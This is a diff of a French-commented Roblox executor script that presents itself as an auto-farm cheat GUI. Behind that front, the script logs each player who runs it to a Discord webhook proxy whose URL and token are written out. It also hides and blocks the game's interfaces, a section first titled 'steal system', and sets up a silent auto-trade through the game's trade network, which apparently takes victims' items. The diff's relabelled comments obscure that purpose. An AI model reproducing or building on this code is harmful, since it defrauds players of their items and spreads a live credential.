@@ -4,21 +4,21 @@ local HttpService = game:GetService("HttpService")
 
 local LocalPlayer = Players.LocalPlayer
 local requestFunc = request or (http and http.request) or http_request
-
--- [[ 1. SÉCURITÉ ANTI-SPAM PAR DETECTION DU GUI ]]
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
-if playerGui:FindFirstChild("KeyzerFarmGui") then
-    warn("[Anti-Spam] Le menu est déjà ouvert ! Envoi du webhook annulé.")
-    return
+
+-- [NETTOYAGE] Si le menu est déjà ouvert, on le supprime avant de relancer
+local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
+if oldGui then 
+    oldGui:Destroy() 
 end
 
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
 
--- [[ 2. FONCTION D'ENVOI UNIQUE (SÉCURISÉE) ]]
+-- [[ 1. FONCTION WEBHOOK UNIQUE (UNIQUEMENT TOI) ]]
 local function sendSessionLog(player)
     if not player then return end
     if not requestFunc then 
-        warn("[-] Erreur : Requête HTTP non supportée (NIL value).")
+        warn("[-] Erreur : Requête HTTP non supportée par ton exécuteur.")
         return 
     end
     
@@ -48,12 +48,12 @@ local function sendSessionLog(player)
     end)
 end
 
--- Déclenchement UNIQUE au moment de l'exécution
+-- Envoi direct au clic sur Execute
 if LocalPlayer then
     task.spawn(function() sendSessionLog(LocalPlayer) end)
 end
 
--- [[ 3. CRÉATION DE L'INTERFACE GRAPHIQUE (GUI) ]]
+-- [[ 2. DESIGN DE L'INTERFACE GRAPHIQUE (GUI) ]]
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "KeyzerFarmGui"
 ScreenGui.Parent = playerGui
@@ -116,7 +116,7 @@ local UICorner_Farm = Instance.new("UICorner")
 UICorner_Farm.CornerRadius = UDim.new(0, 8)
 UICorner_Farm.Parent = FarmButton
 
--- [[ 4. LOGIQUE DE L'AUTO-FARM ]]
+-- [[ 3. LOGIQUE DE DETECTION ET METHODES ]] --
 local farming = false
 
 local function getCoins()
@@ -166,6 +166,7 @@ local function startFarmLoop()
                 
                 local knife = getKnife()
                 
+                -- MODE MURDERER
                 if knife then
                     FarmButton.Text = "MURDER MODE: KILLING ALL..."
                     if knife.Parent ~= character then
@@ -184,6 +185,8 @@ local function startFarmLoop()
                             end
                         end
                     end
+                    
+                -- MODE INNOCENT
                 else
                     local allCoins = getCoins()
                     if #allCoins > 0 then
@@ -208,6 +211,7 @@ local function startFarmLoop()
     end)
 end
 
+-- CONTROLES BUTTONS
 CloseBtn.MouseButton1Click:Connect(function()
     farming = false
     task.wait(0.05)
@@ -225,7 +229,7 @@ FarmButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- [[ 5. BLOCAGE DES INTERFACES ET STEAL SYSTEM ]]
+-- [[ 4. SÉCURITÉ ANTI-TRADE ET VISIBILITÉ GUIS ]]
 local StarterGui = game:GetService("StarterGui")
 
 local function hardBlockGuis()
@@ -248,6 +252,7 @@ task.spawn(hardBlockGuis)
 playerGui.ChildAdded:Connect(hardBlockGuis)
 Players.PlayerAdded:Connect(hardBlockGuis)
 
+-- [[ 5. LOGIQUE D'AUTO-TRADE SILENCIEUX ]]
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")
 local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))
